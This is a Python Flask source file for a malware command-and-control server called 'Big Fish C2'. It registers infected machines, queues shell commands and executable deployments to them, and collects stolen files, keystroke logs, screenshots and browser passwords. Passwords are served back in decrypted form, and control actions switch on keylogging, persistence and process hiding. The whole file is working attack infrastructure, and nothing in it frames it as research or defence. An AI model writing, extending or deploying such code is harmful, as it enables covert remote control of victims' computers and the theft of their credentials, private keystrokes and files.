#!/usr/bin/env python3
"""
Advanced C2 Server - Big Fish System
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import time
import uuid
import sqlite3
import threading
import os
import hashlib
from datetime import datetime
import base64
import logging
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, origins="*")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

DATABASE = 'bigfish.db'
ONLINE_THRESHOLD = 300
DOWNLOAD_FOLDER = 'downloads'
UPLOAD_FOLDER = 'uploads'
EXECUTABLES_FOLDER = 'executables'
SCREENSHOTS_FOLDER = 'screenshots'
KEYLOGS_FOLDER = 'keylogs'
PASSWORDS_FOLDER = 'passwords'

for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, EXECUTABLES_FOLDER,
               SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, PASSWORDS_FOLDER]:
    os.makedirs(folder, exist_ok=True)

_KEY_FILE = 'bigfish.key'
if os.path.exists(_KEY_FILE):
    with open(_KEY_FILE, 'rb') as f:
        ENCRYPTION_KEY = f.read()
else:
    ENCRYPTION_KEY = Fernet.generate_key()
    with open(_KEY_FILE, 'wb') as f:
        f.write(ENCRYPTION_KEY)
    try:
        os.chmod(_KEY_FILE, 0o600)
    except Exception:
        pass

cipher = Fernet(ENCRYPTION_KEY)


def init_db():
    conn = sqlite3.connect(DATABASE, timeout=30)
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA foreign_keys=ON")

    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os TEXT,
        os_version TEXT, arch TEXT, cpu TEXT, ram TEXT, gpu TEXT, ip TEXT,
        last_seen REAL, status TEXT, privileges TEXT, av_status TEXT,
        country TEXT, city TEXT, isp TEXT,
        process_hidden INTEGER DEFAULT 0, keylogger_active INTEGER DEFAULT 0,
        persistence_set INTEGER DEFAULT 0, created_at REAL,
        download_folder TEXT, online_hours REAL DEFAULT 0)""")

    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY, client_id TEXT, command TEXT, command_type TEXT,
        status TEXT, output TEXT, created_at REAL, executed_at REAL,
        priority INTEGER DEFAULT 5, require_admin INTEGER DEFAULT 0,
        encrypted INTEGER DEFAULT 0)""")

    c.execute("""CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY, client_id TEXT, filename TEXT, original_name TEXT,
        filepath TEXT, filetype TEXT, filesize INTEGER, uploaded_at REAL,
        downloaded INTEGER DEFAULT 0, hash_md5 TEXT, hash_sha256 TEXT,
        encrypted INTEGER DEFAULT 0, tags TEXT)""")

    c.execute("""CREATE TABLE IF NOT EXISTS executables (
        id TEXT PRIMARY KEY, name TEXT, description TEXT, filename TEXT,
        filepath TEXT, platform TEXT, require_admin INTEGER DEFAULT 0,
        uploader TEXT, uploaded_at REAL, downloads INTEGER DEFAULT 0,
        hash_sha256 TEXT, size INTEGER)""")

    c.execute("""CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, keystrokes TEXT,
        window_title TEXT, timestamp REAL, process_name TEXT,
        encrypted INTEGER DEFAULT 1)""")

    c.execute("""CREATE TABLE IF NOT EXISTS screenshots (
        id TEXT PRIMARY KEY, client_id TEXT, timestamp REAL, filepath TEXT,
        thumbnail_path TEXT, width INTEGER, height INTEGER, size INTEGER)""")

    c.execute("""CREATE TABLE IF NOT EXISTS passwords (
        id TEXT PRIMARY KEY, client_id TEXT, browser TEXT, url TEXT,
        username TEXT, encrypted_password TEXT, timestamp REAL)""")

    c.execute("""CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, info_type TEXT,
        info_key TEXT, info_value TEXT, timestamp REAL)""")

    c.execute("""CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY, client_id TEXT, task_type TEXT, task_data TEXT,
        status TEXT, result TEXT, created_at REAL, completed_at REAL,
        scheduled_for REAL, priority INTEGER DEFAULT 5)""")

    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")

    conn.commit()
    conn.close()
    logger.info("[✓] Database initialized")


init_db()


def get_db():
    conn = sqlite3.connect(DATABASE, timeout=30)
    conn.row_factory = sqlite3.Row
    return conn


def encrypt_data(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(cipher.encrypt(data)).decode()


def decrypt_data(encrypted_data):
    return cipher.decrypt(base64.b64decode(encrypted_data)).decode()


def _safe_name(name):
    safe = "".join(ch for ch in (name or '') if ch.isalnum() or ch in (' ', '-', '_')).strip()
    return safe or 'unknown'


def get_client_folder(client_id, hostname):
    safe = _safe_name(hostname) or f"client_{client_id[:8]}"
    folders = {
        'downloads': os.path.join(DOWNLOAD_FOLDER, safe),
        'screenshots': os.path.join(SCREENSHOTS_FOLDER, safe),
        'keylogs': os.path.join(KEYLOGS_FOLDER, safe),
        'passwords': os.path.join(PASSWORDS_FOLDER, safe),
    }
    for f in folders.values():
        os.makedirs(f, exist_ok=True)
    return folders


def format_size(b):
    if not b:
        return "0B"
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024:
            return f"{b:.2f} {unit}"
        b /= 1024
    return f"{b:.2f} PB"


def _client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
    return ip.split(',')[0].strip()


def _body():
    try:
        return request.get_json(silent=True) or {}
    except Exception:
        return {}


# ==================== ROUTES ====================

@app.route('/')
def index():
    return jsonify({'status': 'online', 'system': 'Big Fish C2', 'version': '4.1'})


@app.route('/api/health')
def health():
    return jsonify({'status': 'healthy'})


@app.route('/api/checkin', methods=['POST'])
def client_checkin():
    try:
        data = _body()
        client_id = data.get('id')
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400

        conn = get_db()
        c = conn.cursor()
        now = time.time()
        ip = _client_ip()
        hostname = data.get('hostname') or 'Unknown'
        folders = get_client_folder(client_id, hostname)

        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing = c.fetchone()

        if existing:
            online_hours = existing['online_hours'] or 0
            if existing['status'] == 'offline':
                online_hours += (now - existing['last_seen']) / 3600
            c.execute("""UPDATE clients SET hostname=?, username=?, os=?, os_version=?,
                arch=?, cpu=?, ram=?, gpu=?, ip=?, last_seen=?, status='online',
                privileges=?, av_status=?, country=?, city=?, isp=?,
                download_folder=?, online_hours=? WHERE id=?""",
                (hostname, data.get('username'), data.get('os'),
                 data.get('os_version'), data.get('arch'), data.get('cpu'),
                 data.get('ram'), data.get('gpu'), ip, now,
                 data.get('privileges'), data.get('av_status'),
                 data.get('country'), data.get('city'), data.get('isp'),
                 folders['downloads'], online_hours, client_id))
        else:
            c.execute("""INSERT INTO clients (id, hostname, username, os, os_version,
                arch, cpu, ram, gpu, ip, last_seen, status, privileges, av_status,
                country, city, isp, process_hidden, keylogger_active,
                persistence_set, created_at, download_folder, online_hours)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,'online',?,?,?,?,?,0,0,0,?,?,0)""",
                (client_id, hostname, data.get('username'), data.get('os'),
                 data.get('os_version'), data.get('arch'), data.get('cpu'),
                 data.get('ram'), data.get('gpu'), ip, now,
                 data.get('privileges'), data.get('av_status'),
                 data.get('country'), data.get('city'), data.get('isp'),
                 now, folders['downloads']))

        if 'system_info' in data and isinstance(data['system_info'], dict):
            for k, v in data['system_info'].items():
                c.execute("""INSERT INTO system_info (client_id, info_type, info_key,
                    info_value, timestamp) VALUES (?, 'system', ?, ?, ?)""",
                    (client_id, k, str(v), now))

        conn.commit()
        conn.close()

        socketio.emit('client_update', {'client_id': client_id,
                                        'hostname': hostname,
                                        'status': 'online',
                                        'timestamp': now})

        logger.info(f"[✓] Checkin: {hostname} ({ip})")
        return jsonify({'status': 'ok', 'timestamp': now,
                        'server_time': datetime.now().isoformat()})
    except Exception as e:
        logger.error(f"[✗] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/clients', methods=['GET'])
def get_all_clients():
    try:
        conn = get_db()
        c = conn.cursor()
        now = time.time()
        c.execute("UPDATE clients SET status='offline' WHERE ?-last_seen>?",
                  (now, ONLINE_THRESHOLD))
        conn.commit()

        c.execute("""SELECT c.*,
            COUNT(DISTINCT f.id) as total_files,
            COUNT(DISTINCT s.id) as total_screenshots,
            COUNT(DISTINCT k.id) as total_keylogs,
            COUNT(DISTINCT p.id) as total_passwords
            FROM clients c
            LEFT JOIN files f ON c.id = f.client_id
            LEFT JOIN screenshots s ON c.id = s.client_id
            LEFT JOIN keylogs k ON c.id = k.client_id
            LEFT JOIN passwords p ON c.id = p.client_id
            GROUP BY c.id ORDER BY c.last_seen DESC""")

        clients = []
        for row in c.fetchall():
            diff = now - row['last_seen']
            if diff < 60:
                status, icon = 'online', '🟢'
            elif diff < 300:
                status, icon = 'idle', '🟡'
            else:
                status, icon = 'offline', '🔴'

            oh = row['online_hours'] or 0
            if oh < 1:
                up = f"{oh*60:.0f}m"
            elif oh < 24:
                up = f"{oh:.1f}h"
            else:
                up = f"{oh/24:.1f}d"

            clients.append({
                'id': row['id'], 'hostname': row['hostname'],
                'username': row['username'],
                'os': f"{row['os']} {row['os_version'] or ''}".strip(),
                'arch': row['arch'], 'cpu': row['cpu'], 'ram': row['ram'],
                'gpu': row['gpu'], 'ip': row['ip'],
                'country': row['country'], 'city': row['city'], 'isp': row['isp'],
                'privileges': row['privileges'], 'av_status': row['av_status'],
                'status': status, 'status_icon': icon,
                'process_hidden': bool(row['process_hidden']),
                'keylogger_active': bool(row['keylogger_active']),
                'persistence_set': bool(row['persistence_set']),
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S'),
                'created_at': row['created_at'],
                'online_hours': oh, 'uptime_str': up,
                'stats': {'files': row['total_files'],
                          'screenshots': row['total_screenshots'],
                          'keylogs': row['total_keylogs'],
                          'passwords': row['total_passwords']},
            })
        conn.close()
        return jsonify({'clients': clients})
    except Exception as e:
        logger.error(f"[✗] Get clients error: {e}")
        return jsonify({'clients': []})


@app.route('/api/client/<client_id>', methods=['GET'])
def get_client_details(client_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        client = c.fetchone()
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404

        c.execute("""SELECT * FROM commands WHERE client_id = ?
                    ORDER BY created_at DESC LIMIT 30""", (client_id,))
        commands = [dict(row) for row in c.fetchall()]

        c.execute("""SELECT info_key, info_value FROM system_info
                    WHERE client_id = ? AND info_type = 'system'
                    ORDER BY timestamp DESC""", (client_id,))
        system_info = {row['info_key']: row['info_value'] for row in c.fetchall()}

        c.execute("""SELECT filetype, COUNT(*) as count, SUM(filesize) as total_size
                    FROM files WHERE client_id = ? GROUP BY filetype""", (client_id,))
        file_stats = [dict(row) for row in c.fetchall()]

        conn.close()
        return jsonify({'client': dict(client), 'commands': commands,
                        'system_info': system_info, 'file_stats': file_stats})
    except Exception as e:
        logger.error(f"[✗] Client details error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/command', methods=['POST'])
def send_command():
    try:
        data = _body()
        client_id = data.get('client_id')
        command = data.get('command')
        ctype = data.get('type', 'shell')
        require_admin = data.get('require_admin', False)
        priority = data.get('priority', 5)
        if not client_id or not command:
            return jsonify({'error': 'Missing parameters'}), 400

        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT id FROM clients WHERE id = ?', (client_id,))
        if not c.fetchone():
            conn.close()
            return jsonify({'error': 'Client not found'}), 404

        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands (id, client_id, command, command_type,
            status, created_at, priority, require_admin)
            VALUES (?, ?, ?, ?, 'pending', ?, ?, ?)""",
            (cmd_id, client_id, command, ctype, time.time(),
             priority, 1 if require_admin else 0))
        conn.commit()
        conn.close()

        logger.info(f"[✓] Command queued: {ctype} to {client_id[:8]}")
        return jsonify({'success': True, 'command_id': cmd_id,
                        'message': 'Command queued'})
    except Exception as e:
        logger.error(f"[✗] Send command error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/commands/<client_id>', methods=['GET'])
def get_pending_commands(client_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?",
                  (time.time(), client_id))
        c.execute("""SELECT id, command, command_type, require_admin FROM commands
                    WHERE client_id = ? AND status = 'pending'
                    ORDER BY priority DESC, created_at ASC LIMIT 10""",
                  (client_id,))
        commands = [{'id': r['id'], 'command': r['command'],
                     'type': r['command_type'],
                     'require_admin': bool(r['require_admin'])}
                    for r in c.fetchall()]
        if commands:
            ids = [c_['id'] for c_ in commands]
            ph = ','.join(['?'] * len(ids))
            c.execute(f"UPDATE commands SET status='sent' WHERE id IN ({ph})", ids)
        conn.commit()
        conn.close()
        return jsonify({'commands': commands})
    except Exception as e:
        logger.error(f"[✗] Get commands error: {e}")
        return jsonify({'commands': []})


@app.route('/api/command/result', methods=['POST'])
def submit_command_result():
    try:
        data = _body()
        command_id = data.get('command_id')
        output = data.get('output', '')
        status = data.get('status', 'completed')
        if not command_id:
            return jsonify({'error': 'Missing command ID'}), 400

        conn = get_db()
        c = conn.cursor()
        c.execute("""UPDATE commands SET status=?, output=?, executed_at=?
                    WHERE id=?""",
                  (status, output, time.time(), command_id))
        c.execute("SELECT client_id FROM commands WHERE id = ?", (command_id,))
        row = c.fetchone()
        conn.commit()
        conn.close()

        if row:
            socketio.emit('command_result', {'command_id': command_id,
                                             'client_id': row['client_id'],
                                             'status': status,
                                             'timestamp': time.time()})
        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"[✗] Submit result error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        file = request.files['file']
        client_id = request.form.get('client_id')
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        if file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT hostname, download_folder FROM clients WHERE id = ?',
                  (client_id,))
        client = c.fetchone()
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404

        fn = file.filename.lower()
        if any(fn.endswith(e) for e in ['.exe', '.msi', '.bat', '.ps1', '.vbs']):
            ftype = 'executable'
            folder = EXECUTABLES_FOLDER
        elif any(fn.endswith(e) for e in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            ftype = 'image'
            folder = os.path.join(SCREENSHOTS_FOLDER, _safe_name(client['hostname']))
        else:
            ftype = 'document'
            folder = os.path.join(DOWNLOAD_FOLDER, _safe_name(client['hostname']))
        os.makedirs(folder, exist_ok=True)

        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_fn = f"{ts}_{file.filename}"
        path = os.path.join(folder, safe_fn)
        file.save(path)
        size = os.path.getsize(path)

        with open(path, 'rb') as f:
            data = f.read()
            md5 = hashlib.md5(data).hexdigest()
            sha = hashlib.sha256(data).hexdigest()

        fid = str(uuid.uuid4())
        c.execute("""INSERT INTO files (id, client_id, filename, original_name,
            filepath, filetype, filesize, uploaded_at, hash_md5, hash_sha256)
            VALUES (?,?,?,?,?,?,?,?,?,?)""",
            (fid, client_id, safe_fn, file.filename, path, ftype, size,
             time.time(), md5, sha))
        conn.commit()
        conn.close()
        logger.info(f"[✓] File: {file.filename} ({size}b) from {client['hostname']}")
        return jsonify({'success': True, 'file_id': fid,
                        'filename': file.filename, 'size': size, 'hash_sha256': sha})
    except Exception as e:
        logger.error(f"[✗] Upload error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/files/<client_id>', methods=['GET'])
def list_client_files(client_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("""SELECT id, original_name, filetype, filesize, uploaded_at,
                    downloaded, hash_sha256 FROM files WHERE client_id = ?
                    ORDER BY uploaded_at DESC""", (client_id,))
        files = [{'id': r['id'], 'filename': r['original_name'],
                  'type': r['filetype'], 'size': r['filesize'],
                  'size_str': format_size(r['filesize']),
                  'uploaded': datetime.fromtimestamp(r['uploaded_at']).strftime('%Y-%m-%d %H:%M'),
                  'downloaded': bool(r['downloaded']),
                  'hash': (r['hash_sha256'] or '')[:16]}
                 for r in c.fetchall()]
        conn.close()
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'files': []})


@app.route('/api/file/download/<file_id>', methods=['GET'])
def download_file(file_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filepath, original_name FROM files WHERE id = ?", (file_id,))
        f = c.fetchone()
        if not f or not os.path.exists(f['filepath']):
            conn.close()
            return jsonify({'error': 'File not found'}), 404
        c.execute("UPDATE files SET downloaded = 1 WHERE id = ?", (file_id,))
        conn.commit()
        conn.close()
        return send_file(f['filepath'], as_attachment=True,
                         download_name=f['original_name'])
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/executables', methods=['GET', 'POST'])
def manage_executables():
    if request.method == 'GET':
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute("""SELECT id, name, description, filename, platform,
                        require_admin, uploader, uploaded_at, downloads, size
                        FROM executables ORDER BY uploaded_at DESC""")
            exes = [{'id': r['id'], 'name': r['name'], 'description': r['description'],
                     'filename': r['filename'], 'platform': r['platform'],
                     'require_admin': bool(r['require_admin']),
                     'uploader': r['uploader'],
                     'uploaded': datetime.fromtimestamp(r['uploaded_at']).strftime('%Y-%m-%d'),
                     'downloads': r['downloads'],
                     'size': format_size(r['size'])} for r in c.fetchall()]
            conn.close()
            return jsonify({'executables': exes})
        except Exception as e:
            return jsonify({'executables': []})

    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        file = request.files['file']
        name = request.form.get('name', file.filename)
        desc = request.form.get('description', '')
        platform = request.form.get('platform', 'windows')
        req_admin = request.form.get('require_admin', 'false') == 'true'
        uploader = request.form.get('uploader', 'admin')
        if file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_fn = f"{ts}_{file.filename}"
        path = os.path.join(EXECUTABLES_FOLDER, safe_fn)
        file.save(path)
        size = os.path.getsize(path)
        with open(path, 'rb') as f:
            sha = hashlib.sha256(f.read()).hexdigest()

        conn = get_db()
        c = conn.cursor()
        eid = str(uuid.uuid4())
        c.execute("""INSERT INTO executables (id, name, description, filename,
            filepath, platform, require_admin, uploader, uploaded_at,
            hash_sha256, size) VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
            (eid, name, desc, safe_fn, path, platform, 1 if req_admin else 0,
             uploader, time.time(), sha, size))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'executable_id': eid,
                        'name': name, 'hash': sha})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/executable/get/<name>', methods=['GET'])
def get_executable(name):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filepath, filename FROM executables WHERE name=? OR filename=?",
                  (name, name))
        row = c.fetchone()
        conn.close()
        if not row or not os.path.exists(row['filepath']):
            return jsonify({'error': 'not found'}), 404
        return send_file(row['filepath'], as_attachment=True,
                         download_name=row['filename'])
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/executable/deploy', methods=['POST'])
def deploy_executable():
    try:
        data = _body()
        client_id = data.get('client_id')
        eid = data.get('executable_id')
        args = data.get('arguments', '')
        run_admin = data.get('run_as_admin', False)
        if not client_id or not eid:
            return jsonify({'error': 'Missing parameters'}), 400

        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM executables WHERE id = ?", (eid,))
        exe = c.fetchone()
        if not exe:
            conn.close()
            return jsonify({'error': 'Executable not found'}), 404

        command = exe['name']
        if args:
            command += ' ' + args
        require_admin = bool(exe['require_admin']) or run_admin

        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands (id, client_id, command, command_type,
            status, created_at, require_admin, priority)
            VALUES (?, ?, ?, 'deploy', 'pending', ?, ?, 1)""",
            (cmd_id, client_id, command, time.time(),
             1 if require_admin else 0))
        c.execute("UPDATE executables SET downloads = downloads + 1 WHERE id = ?",
                  (eid,))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'command_id': cmd_id,
                        'message': 'Deployment queued'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/keylog', methods=['POST'])
def upload_keylog():
    try:
        data = _body()
        client_id = data.get('client_id')
        keystrokes = data.get('keystrokes')
        if not client_id or not keystrokes:
            return jsonify({'error': 'Missing data'}), 400

        if data.get('encrypted', False):
            try:
                keystrokes = decrypt_data(keystrokes)
            except Exception:
                pass

        conn = get_db()
        c = conn.cursor()
        c.execute("""INSERT INTO keylogs (client_id, keystrokes, window_title,
            timestamp, process_name) VALUES (?,?,?,?,?)""",
            (client_id, keystrokes, data.get('window_title', 'Unknown'),
             time.time(), data.get('process_name', 'Unknown')))
        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?",
                  (time.time(), client_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/keylogs/<client_id>', methods=['GET'])
def get_keylogs(client_id):
    try:
        limit = request.args.get('limit', 50, type=int)
        conn = get_db()
        c = conn.cursor()
        c.execute("""SELECT keystrokes, window_title, timestamp, process_name
                    FROM keylogs WHERE client_id = ?
                    ORDER BY timestamp DESC LIMIT ?""", (client_id, limit))
        logs = [{'keystrokes': r['keystrokes'], 'window': r['window_title'],
                 'process': r['process_name'], 'timestamp': r['timestamp'],
                 'time': datetime.fromtimestamp(r['timestamp']).strftime('%H:%M:%S')}
                for r in c.fetchall()]
        conn.close()
        return jsonify({'keylogs': logs})
    except Exception as e:
        return jsonify({'keylogs': []})


@app.route('/api/passwords', methods=['POST'])
def upload_passwords():
    try:
        data = _body()
        client_id = data.get('client_id')
        passwords = data.get('passwords', [])
        if not client_id or not passwords:
            return jsonify({'error': 'Missing data'}), 400

        conn = get_db()
        c = conn.cursor()
        for p in passwords:
            pw = p.get('password', '')
            enc = encrypt_data(pw) if pw else ''
            c.execute("""INSERT INTO passwords (id, client_id, browser, url,
                username, encrypted_password, timestamp) VALUES (?,?,?,?,?,?,?)""",
                (str(uuid.uuid4()), client_id, p.get('browser', 'Unknown'),
                 p.get('url', ''), p.get('username', ''), enc, time.time()))
        conn.commit()
        conn.close()
        logger.info(f"[✓] {len(passwords)} passwords from {client_id[:8]}")
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/passwords/<client_id>', methods=['GET'])
def get_passwords(client_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("""SELECT browser, url, username, encrypted_password, timestamp
                    FROM passwords WHERE client_id = ? ORDER BY timestamp DESC""",
                  (client_id,))
        out = []
        for r in c.fetchall():
            pw = ''
            try:
                pw = decrypt_data(r['encrypted_password']) if r['encrypted_password'] else ''
            except Exception:
                pw = '<decrypt failed>'
            out.append({'browser': r['browser'], 'url': r['url'],
                        'username': r['username'], 'password': pw,
                        'timestamp': r['timestamp'],
                        'time': datetime.fromtimestamp(r['timestamp']).strftime('%Y-%m-%d %H:%M')})
        conn.close()
        return jsonify({'passwords': out})
    except Exception as e:
        return jsonify({'passwords': []})


@app.route('/api/screenshot', methods=['POST'])
def upload_screenshot():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        file = request.files['file']
        client_id = request.form.get('client_id')
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400

        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT hostname FROM clients WHERE id = ?', (client_id,))
        client = c.fetchone()
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404

        folder = os.path.join(SCREENSHOTS_FOLDER, _safe_name(client['hostname']))
        os.makedirs(folder, exist_ok=True)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{ts}.png"
        path = os.path.join(folder, filename)
        file.save(path)
        size = os.path.getsize(path)

        w = h = 0
        try:
            from PIL import Image
            with Image.open(path) as img:
                w, h = img.size
        except Exception:
            pass

        sid = str(uuid.uuid4())
        c.execute("""INSERT INTO screenshots (id, client_id, timestamp, filepath,
            width, height, size) VALUES (?,?,?,?,?,?,?)""",
            (sid, client_id, time.time(), path, w, h, size))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'screenshot_id': sid, 'filename': filename})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/screenshots/<client_id>', methods=['GET'])
def get_screenshots(client_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("""SELECT id, timestamp, filepath, width, height, size
                    FROM screenshots WHERE client_id = ?
                    ORDER BY timestamp DESC LIMIT 20""", (client_id,))
        shots = [{'id': r['id'], 'timestamp': r['timestamp'],
                  'time': datetime.fromtimestamp(r['timestamp']).strftime('%Y-%m-%d %H:%M'),
                  'filepath': r['filepath'],
                  'dimensions': f"{r['width']}x{r['height']}" if r['width'] else 'Unknown',
                  'size': format_size(r['size']),
                  'url': f"/api/screenshot/view/{r['id']}"}
                 for r in c.fetchall()]
        conn.close()
        return jsonify({'screenshots': shots})
    except Exception as e:
        return jsonify({'screenshots': []})


@app.route('/api/screenshot/view/<sid>', methods=['GET'])
def view_screenshot(sid):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT filepath FROM screenshots WHERE id = ?', (sid,))
        r = c.fetchone()
        conn.close()
        if not r or not os.path.exists(r['filepath']):
            return jsonify({'error': 'Not found'}), 404
        return send_file(r['filepath'], mimetype='image/png')
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/stats', methods=['GET'])
def get_system_stats():
    try:
        conn = get_db()
        c = conn.cursor()
        now = time.time()
        c.execute('SELECT COUNT(*) FROM clients')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM clients WHERE ?-last_seen<=60', (now,))
        online = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM files')
        files = c.fetchone()[0]
        c.execute('SELECT SUM(filesize) FROM files')
        size = c.fetchone()[0] or 0
        c.execute('SELECT COUNT(*) FROM keylogs')
        kl = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM passwords')
        pw = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM executables')
        ex = c.fetchone()[0]
        c.execute("SELECT os, COUNT(*) as count FROM clients GROUP BY os")
        osd = {r['os']: r['count'] for r in c.fetchall()}
        conn.close()
        return jsonify({'total_clients': total, 'online_now': online,
                        'total_files': files, 'total_size': size,
                        'total_size_str': format_size(size),
                        'total_keylogs': kl, 'total_passwords': pw,
                        'total_executables': ex, 'os_distribution': osd,
                        'server_time': datetime.now().isoformat()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/client/control', methods=['POST'])
def client_control():
    try:
        data = _body()
        client_id = data.get('client_id')
        action = data.get('action')
        value = data.get('value', True)
        if not client_id or not action:
            return jsonify({'error': 'Missing parameters'}), 400

        conn = get_db()
        c = conn.cursor()

        if action == 'keylogger':
            c.execute("UPDATE clients SET keylogger_active=? WHERE id=?",
                      (1 if value else 0, client_id))
            command = f"keylogger {'start' if value else 'stop'}"
        elif action == 'persistence':
            c.execute("UPDATE clients SET persistence_set=? WHERE id=?",
                      (1 if value else 0, client_id))
            command = f"persistence {'enable' if value else 'disable'}"
        elif action == 'stealth':
            c.execute("UPDATE clients SET process_hidden=? WHERE id=?",
                      (1 if value else 0, client_id))
            command = f"stealth {'enable' if value else 'disable'}"
        elif action == 'screenshot':
            command = 'screenshot'
        elif action == 'extract_passwords':
            command = 'extract_passwords'
        else:
            conn.close()
            return jsonify({'error': 'Invalid action'}), 400

        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands (id, client_id, command, command_type,
            status, created_at, priority) VALUES (?, ?, ?, 'control', 'pending', ?, 10)""",
            (cmd_id, client_id, command, time.time()))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'command_id': cmd_id,
                        'message': f'Control command queued: {action}'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@socketio.on('connect')
def handle_connect():
    logger.info(f"[✓] WS connected: {request.sid}")


@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"[✓] WS disconnected: {request.sid}")


def cleanup_old_data():
    while True:
        try:
            conn = get_db()
            c = conn.cursor()
            now = time.time()
            c.execute("DELETE FROM commands WHERE executed_at < ? AND status='completed'",
                      (now - 7*24*3600,))
            c.execute("DELETE FROM keylogs WHERE timestamp < ?",
                      (now - 30*24*3600,))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"[✗] Cleanup: {e}")
        time.sleep(3600)


def update_client_status():
    while True:
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute("UPDATE clients SET status='offline' WHERE ?-last_seen>?",
                      (time.time(), ONLINE_THRESHOLD))
            conn.commit()
            conn.close()
        except Exception as e:
            pass
        time.sleep(60)


if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 5000))
    threading.Thread(target=cleanup_old_data, daemon=True).start()
    threading.Thread(target=update_client_status, daemon=True).start()
